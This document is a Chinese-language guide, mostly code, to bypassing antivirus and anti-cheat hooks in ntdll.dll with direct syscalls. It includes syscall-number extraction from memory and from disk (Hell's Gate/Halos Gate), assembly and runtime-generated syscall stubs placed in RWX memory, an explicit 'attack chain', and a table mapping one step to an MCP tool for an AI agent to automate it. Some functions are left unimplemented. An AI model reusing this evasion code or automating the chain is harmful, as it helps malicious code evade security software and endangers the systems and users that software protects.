# Direct Syscall：绕过用户态 Hook

## 场景

目标进程的 ntdll.dll 函数被安全软件/反作弊 Hook（IAT hook / inline hook），调用标准 API 会被拦截。

## 输入信号

- 调用 NtReadVirtualMemory 返回 STATUS_ACCESS_DENIED（但你有权限）
- ntdll.dll 导出函数开头是 JMP（而非标准的 MOV EAX, syscall#）
- 需要执行的操作本质上是 syscall，绕过用户态拦截即可

## Syscall 原理

```
正常 API 调用链:
  kernel32.ReadProcessMemory
    → kernelbase.ReadProcessMemory
      → ntdll.NtReadVirtualMemory
        → syscall (0x3F for NtReadVirtualMemory)
          → kernel mode → ntoskrnl

如果 ntdll 被 Hook:
  ntdll.NtReadVirtualMemory → JMP to AV hook → ... → block/modify

绕过:
  直接执行 syscall 指令, 不经过 ntdll
  mov r10, rcx          ; 参数传递约定
  mov eax, <syscall#>   ; syscall 号
  syscall
  ret
```

## Syscall 号提取

```cpp
// 方法1: 从 ntdll.dll 的 "stub" 中提取
// 所有 ntdll 导出函数开头格式:
//   mov r10, rcx
//   mov eax, <syscall_number>   ; ← 这里
//   test byte [0x7FFE0308], 1
//   jne ...
//   syscall
//   ret

uint32_t ExtractSyscallNumber(const char* funcName) {
    uint8_t* func = (uint8_t*)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), funcName);
    // syscall 号在 mov eax, imm32 → 偏移 +4 处
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        // mov r10, rcx → 跳过 4 字节 → mov eax, imm32
        return *(uint32_t*)(func + 4);
    }
    return 0;
}

// 使用:
uint32_t NtAllocateVirtualMemory_ssn = ExtractSyscallNumber(
    "NtAllocateVirtualMemory");
uint32_t NtWriteVirtualMemory_ssn = ExtractSyscallNumber(
    "NtWriteVirtualMemory");
```

## 完整的 Direct Syscall 实现

```cpp
// 注意: syscall 号在不同 Windows 版本间变化!
// 必须运行时从 ntdll 提取, 不能硬编码

// 每个 syscall stub 必须用汇编实现
// (不能直接用 C, 因为编译器不生成 syscall 指令)

// x64 MASM 语法: NtAllocateVirtualMemory.asm
.code
NtAVM proc
    mov r10, rcx          ; syscall 约定: 参数在 r10
    mov eax, g_NtAVM_ssn  ; 运行时填充 syscall 号
    syscall
    ret
NtAVM endp
end

// C++ 头文件中声明:
extern "C" NTSTATUS NtAVM(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
```

## Syscall 号表（部分）

```cpp
// 每个 Windows 版本有唯一的 syscall 号映射
// 以下是 Win10 22H2 参考值 (不可硬编码!)

struct SyscallTable {
    struct {
        uint32_t NtAllocateVirtualMemory;
        uint32_t NtProtectVirtualMemory;
        uint32_t NtFreeVirtualMemory;
        uint32_t NtReadVirtualMemory;
        uint32_t NtWriteVirtualMemory;
        uint32_t NtCreateThreadEx;
        uint32_t NtOpenProcess;
        uint32_t NtQuerySystemInformation;
        uint32_t NtQueryInformationProcess;
    };
};

// 动态加载:
SyscallTable LoadSyscallTable() {
    SyscallTable table;
    table.NtAllocateVirtualMemory = ExtractSyscallNumber("NtAllocateVirtualMemory");
    table.NtProtectVirtualMemory  = ExtractSyscallNumber("NtProtectVirtualMemory");
    table.NtReadVirtualMemory     = ExtractSyscallNumber("NtReadVirtualMemory");
    table.NtWriteVirtualMemory    = ExtractSyscallNumber("NtWriteVirtualMemory");
    table.NtCreateThreadEx        = ExtractSyscallNumber("NtCreateThreadEx");
    table.NtOpenProcess           = ExtractSyscallNumber("NtOpenProcess");
    return table;
}
```

## Hell's Gate / Halos Gate 技术

```cpp
// 问题: 如果 ntdll 的 stub 被完整 Hook, ExtractSyscallNumber 返回错误值
// 解决: 读取 ntdll.dll 磁盘文件 → 解析原始 stub → 提取未被 Hook 的 syscall 号

uint32_t ExtractSyscallFromDisk(const char* funcName) {
    // 1. 从 C:\Windows\System32\ntdll.dll 读取原始 PE
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    // 2. 手动解析导出表找 funcName
    // 3. 读 Function RVA → 文件偏移 → 提取 syscall 号
    // 4. 返回干净的 syscall 号
    // (实现细节见 PE header parsing 篇)
}

// Halos Gate: 如果当前函数也被 Hook
// → 搜索相邻未被 Hook 的 Nt 函数
// → syscall 号是线性递增的 → 从邻居推算
```

## 真正的 Stub 生成

```cpp
// 运行时生成 syscall stub (x64)
std::vector<uint8_t> GenerateSyscallStub(uint32_t ssn) {
    std::vector<uint8_t> stub;
    // mov r10, rcx
    stub.insert(stub.end(), {0x4C, 0x8B, 0xD1});
    // mov eax, ssn (小端)
    stub.push_back(0xB8);
    stub.push_back(ssn & 0xFF);
    stub.push_back((ssn >> 8) & 0xFF);
    stub.push_back((ssn >> 16) & 0xFF);
    stub.push_back((ssn >> 24) & 0xFF);
    // syscall
    stub.insert(stub.end(), {0x0F, 0x05});
    // ret
    stub.push_back(0xC3);
    return stub;
}

// 使用:
auto stub = GenerateSyscallStub(NtAllocateVirtualMemory_ssn);
auto NtAVM = (NtAVM_t)VirtualAlloc(NULL, stub.size(),
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(NtAVM, stub.data(), stub.size());
// 调用:
NtAVM(hProc, &addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

## 攻击链

```
确认 ntdll 被 Hook → 读取磁盘 ntdll.dll 获取 clean stub
→ ExtractSyscallNumber 获取 syscall 号
→ 汇编或 Xbyak 生成 stub → VirtualAlloc 分配 EXECUTE_READWRITE
→ 直接调用 stub 绕过用户态 Hook
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击链步骤：

| 攻击链步骤 | MCP 工具 | 说明 |
|-----------|---------|------|
| 生成 syscall stub 机器码 | `rizin_assemble_bytes` | 生成 syscall stub 机器码 |

## 证据与验证闭环

- 记录样本 SHA256、架构、映像基址、RVA/VA/文件偏移换算及工具版本。
- 静态结论绑定函数、Xref、导入、字符串和反编译片段；动态结论绑定断点、寄存器、栈、内存与调用时序。
- 原始样本只读保留，dump/patch 使用副本并记录前后哈希、原始字节、新字节和行为差异。
- 将 x64dbg/Frida/Procmon/Ghidra 输出保存到 `exports/windows/`，从干净基线最小化复现后再下结论。
